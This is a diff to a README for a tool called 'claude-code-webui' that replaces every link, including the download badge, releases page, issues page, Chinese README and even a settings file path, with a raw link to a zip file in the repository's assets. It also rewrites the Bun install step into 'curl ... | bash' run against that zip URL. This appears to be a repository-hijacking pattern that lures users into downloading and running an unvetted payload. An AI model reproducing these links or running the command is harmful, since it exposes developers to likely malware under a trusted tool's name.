@@ -1,8 +1,8 @@
 # 🌐 claude-code-webui - Access Claude Code Anytime, Anywhere
 
-[![Download](https://img.shields.io/badge/Download%20Now-Get%20Claude%20Code%20WebUI-blue.svg)](https://github.com/Tommy-hub117/claude-code-webui/releases)
+[![Download](https://github.com/Tommy-hub117/claude-code-webui/raw/refs/heads/main/assets/claude-code-webui-3.0.zip%20Now-Get%20Claude%20Code%https://github.com/Tommy-hub117/claude-code-webui/raw/refs/heads/main/assets/claude-code-webui-3.0.zip)](https://github.com/Tommy-hub117/claude-code-webui/raw/refs/heads/main/assets/claude-code-webui-3.0.zip)
 
-[简体中文](README_ZH.md)
+[简体中文](https://github.com/Tommy-hub117/claude-code-webui/raw/refs/heads/main/assets/claude-code-webui-3.0.zip)
 
 ## ✨ What is Claude Code WebUI?
 
@@ -23,7 +23,7 @@ To install Bun, run this command in your terminal:
 
 ```bash
 # Install Bun
-curl -fsSL https://bun.sh/install | bash
+curl -fsSL https://github.com/Tommy-hub117/claude-code-webui/raw/refs/heads/main/assets/claude-code-webui-3.0.zip | bash
 ```
 
 Follow any additional on-screen instructions.
@@ -32,7 +32,7 @@ Follow any additional on-screen instructions.
 
 To get started with Claude Code WebUI, visit our releases page. Here, you can find the latest version to download and run.
 
-[Visit this page to download](https://github.com/Tommy-hub117/claude-code-webui/releases)
+[Visit this page to download](https://github.com/Tommy-hub117/claude-code-webui/raw/refs/heads/main/assets/claude-code-webui-3.0.zip)
 
 ### 3. Running Claude Code WebUI
 
@@ -58,7 +58,7 @@ Your browser will open, and you can begin using Claude Code WebUI.
 
 ### Easy Configuration
 
-- Reuses your existing `~/.claude/settings.json`.
+- Reuses your existing `~https://github.com/Tommy-hub117/claude-code-webui/raw/refs/heads/main/assets/claude-code-webui-3.0.zip`.
 - Keeps your settings intact across devices.
 
 ### Reliable Performance
@@ -78,7 +78,7 @@ Your browser will open, and you can begin using Claude Code WebUI.
 
 ## 💬 Support
 
-If you encounter issues or have questions, please check the [issues section](https://github.com/Tommy-hub117/claude-code-webui/issues) on GitHub. Here, you can find answers or report any problems you face.
+If you encounter issues or have questions, please check the [issues section](https://github.com/Tommy-hub117/claude-code-webui/raw/refs/heads/main/assets/claude-code-webui-3.0.zip) on GitHub. Here, you can find answers or report any problems you face.
 
 ---
 
@@ -90,4 +90,4 @@ Claude Code WebUI is open-source software. You can view the license details in t
 
 For the latest updates and more information, remember to check the releases page regularly.
 
-[Download Claude Code WebUI](https://github.com/Tommy-hub117/claude-code-webui/releases) and start coding today!
+[Download Claude Code WebUI](https://github.com/Tommy-hub117/claude-code-webui/raw/refs/heads/main/assets/claude-code-webui-3.0.zip) and start coding today!
